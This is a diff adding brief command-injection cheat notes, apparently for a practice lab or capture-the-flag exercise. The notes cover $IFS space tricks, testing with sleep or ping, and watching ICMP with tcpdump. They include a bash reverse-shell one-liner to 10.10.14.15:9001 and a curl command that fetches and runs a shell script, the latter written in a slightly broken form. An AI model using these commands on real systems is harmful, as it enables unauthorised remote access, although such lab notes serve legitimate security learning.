@@ -1,0 +1,15 @@
+$IFS = space
+tab is a space
+
+if trying command injection, try to do a sleep to get it working first
+or try to do a ping to local ip address
+
+if trying ping, do a tcpdump on the ip address using: sudo tcpdump -n -i tun0 icmp
+
+if command injection works, create a bash shell
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'
+
+if the bash doesnt work, try to do with curl
+
+curl -o /dev/shm/shell.sh http://ip:port bash /dev/shm/shell.sh
